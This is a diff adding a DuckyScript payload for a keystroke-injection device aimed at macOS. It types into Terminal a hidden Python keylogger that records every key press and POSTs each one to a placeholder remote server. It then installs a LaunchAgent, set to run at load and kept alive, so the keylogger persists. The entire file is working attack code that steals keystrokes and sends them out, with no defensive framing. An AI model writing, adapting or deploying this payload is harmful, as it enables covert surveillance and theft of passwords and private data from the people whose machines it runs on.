@@ -1,0 +1,236 @@
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING mkdir -p ~/.local/share
+ENTER
+DELAY 500
+STRING cat << 'EOF' > ~/.local/share/.key.py
+ENTER
+DELAY 500
+STRING import logging
+ENTER
+DELAY 500
+STRING import requests
+ENTER
+DELAY 500
+STRING from pynput import keyboard
+ENTER
+DELAY 500
+STRING import os
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING # Ensure the log directory exists
+ENTER
+DELAY 500
+STRING log_directory = os.path.expanduser('~/keylogger_logs')
+ENTER
+DELAY 500
+STRING if not os.path.exists(log_directory):
+ENTER
+DELAY 500
+STRING     os.makedirs(log_directory)
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING # Configure logging
+ENTER
+DELAY 500
+STRING log_file = os.path.join(log_directory, 'keylogger.log')
+ENTER
+DELAY 500
+STRING readable_log_file = os.path.join(log_directory, 'keylogger_readable.log')
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING logging.basicConfig(filename=log_file, level=logging.INFO, 
+ENTER
+DELAY 500
+STRING                     format='%(asctime)s: %(message)s')
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING readable_logger = logging.getLogger('readable_logger')
+ENTER
+DELAY 500
+STRING readable_handler = logging.FileHandler(readable_log_file)
+ENTER
+DELAY 500
+STRING readable_handler.setLevel(logging.INFO)
+ENTER
+DELAY 500
+STRING readable_formatter = logging.Formatter('%(asctime)s - %(message)s')
+ENTER
+DELAY 500
+STRING readable_handler.setFormatter(readable_formatter)
+ENTER
+DELAY 500
+STRING readable_logger.addHandler(readable_handler)
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def send_to_server(data):
+ENTER
+DELAY 500
+STRING     url = 'http://x.x.x.x:port/keylogger'
+ENTER
+DELAY 500
+STRING     try:
+ENTER
+DELAY 500
+STRING         response = requests.post(url, json=data)
+ENTER
+DELAY 500
+STRING         if response.status_code == 200:
+ENTER
+DELAY 500
+STRING             logging.info(f"Successfully sent data to server: {data}")
+ENTER
+DELAY 500
+STRING         else:
+ENTER
+DELAY 500
+STRING             logging.error(f"Failed to send data to server. Status code: {response.status_code}")
+ENTER
+DELAY 500
+STRING     except requests.RequestException as e:
+ENTER
+DELAY 500
+STRING         logging.error(f"Error sending data to server: {e}")
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def on_press(key):
+ENTER
+DELAY 500
+STRING     try:
+ENTER
+DELAY 500
+STRING         key_data = {'key': key.char}
+ENTER
+DELAY 500
+STRING     except AttributeError:
+ENTER
+DELAY 500
+STRING         key_data = {'key': str(key)}
+ENTER
+DELAY 500
+STRING     
+ENTER
+DELAY 500
+STRING     logging.info(f"Key pressed: {key_data['key']}")
+ENTER
+DELAY 500
+STRING     readable_logger.info(f"Key pressed: {key_data['key']}")
+ENTER
+DELAY 500
+STRING     send_to_server(key_data)
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def main():
+ENTER
+DELAY 500
+STRING     with keyboard.Listener(on_press=on_press) as listener:
+ENTER
+DELAY 500
+STRING         listener.join()
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING if __name__ == "__main__":
+ENTER
+DELAY 500
+STRING     main()
+ENTER
+DELAY 500
+STRING EOF
+ENTER
+DELAY 500
+STRING chmod +x ~/.local/share/.key.py
+ENTER
+DELAY 500
+STRING mkdir -p ~/Library/LaunchAgents
+ENTER
+DELAY 500
+STRING cat << 'EOF' > ~/Library/LaunchAgents/com.example.keylogger.plist
+ENTER
+DELAY 500
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+DELAY 500
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+DELAY 500
+STRING <plist version="1.0">
+ENTER
+DELAY 500
+STRING <dict>
+ENTER
+DELAY 500
+STRING     <key>Label</key>
+ENTER
+DELAY 500
+STRING     <string>com.example.keylogger</string>
+ENTER
+DELAY 500
+STRING     <key>ProgramArguments</key>
+ENTER
+DELAY 500
+STRING     <array>
+ENTER
+DELAY 500
+STRING         <string>/usr/bin/python3</string>
+ENTER
+DELAY 500
+STRING         <string>/Users/$USER/.local/share/.key.py</string>
+ENTER
+DELAY 500
+STRING     </array>
+ENTER
+DELAY 500
+STRING     <key>RunAtLoad</key>
+ENTER
+DELAY 500
+STRING     <true/>
+ENTER
+DELAY 500
+STRING     <key>KeepAlive</key>
+ENTER
+DELAY 500
+STRING     <true/>
+ENTER
+DELAY 500
+STRING </dict>
+ENTER
+DELAY 500
+STRING </plist>
+ENTER
+DELAY 500
+STRING EOF
+ENTER
+DELAY 500
+STRING launchctl load ~/Library/LaunchAgents/com.example.keylogger.plist
+ENTER
+DELAY 500
+STRING exit
+ENTER
